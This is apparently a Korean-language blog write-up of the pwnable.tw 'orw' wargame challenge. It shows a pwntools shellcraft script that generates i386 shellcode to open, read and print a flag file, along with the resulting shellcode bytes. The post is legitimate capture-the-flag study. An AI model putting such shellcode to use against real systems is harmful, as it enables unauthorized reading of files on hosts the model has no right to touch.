---
layout: post
title: ! ' [pwnable.tw] orw (100pt) '
excerpt_separator: <!--more-->
comments: true
tags:
  - Write-up
  - Wargame
---

심심해서 [pwnable.tw](https://pwnable.tw/challenge/) 쉬운 문제 풀었다.

근데 쉘크래프트 써본게 처음이라 정리 해 본다.

<!--more-->

## 개요

사실 이전에도 그랬고, 한땀 한 땀 `shellcode` 작성하다가 화가 나는 경험을 많이 했다.

그런데 이번에 문제풀다가 코드 자체를 잘못짰다는걸 깨닫고 멘붕에 빠져서 푸는걸 접으려고 했는데, `pwntools`에서 제공하는 `shellcraft` 생각이 나서 마지막으로 속는다고 생각하고 공부했다.

그런데 공부하길 잘한 것 같다 :D



## orw

문제는 그렇게 안 어렵다. 쉘 코드를 올리면 바로 실행되는데 대신 시스템 콜은 o(pen), r(ead), w(rite)만 가능하다. 근데 저거 주면... 당연히 다 준거다...

쉘 코드를 만들 줄 아냐고 물어보는 문제 같은데, 만들다가 너무 귀찮아서 때려칠려는 찰나 `shellcraft`느님이 강림하셨으니!!!



## Generating Shellcode

```python
from pwn import *

context(arch='i386', os='linux')

def genCode(sc) :
    return "".join(['\\x{:02X}'.format(ord(i)) for i in asm(sc)])

#print "".join(['\\x{:02X}'.format(ord(i)) for i in asm(shellcraft.open('/home/orw/flag').rstrip())])

shellcode = (genCode(shellcraft.open('/home/orw/flag').rstrip()))
shellcode += (genCode(shellcraft.syscall('SYS_read', 3, 'esp', 64).rstrip()))
shellcode += (genCode(shellcraft.syscall('SYS_write', 1, 'esp', 64).rstrip()))

print shellcode
log.info(len(shellcode))
```

> root@ubuntu:~/challenges/pwnable.tw/orw# python shellcode.py 
>
> \x68\x01\x01\x01\x01\x81\x34\x24\x60\x66\x01\x01\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\x6A\x05\x58\xCD\x80\x6A\x03\x58\x6A\x03\x5B\x89\xE1\x6A\x40\x5A\xCD\x80\x6A\x04\x58\x6A\x01\x5B\x89\xE1\x6A\x40\x5A\xCD\x80
>
> [*] 256

와우...

쉘코드가... 그냥 뚝딱 하고 나와버린다.

사랑합니다 `pwntools` ㅠㅠㅠㅠㅠ
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEzODAwODkxMDFdfQ==
-->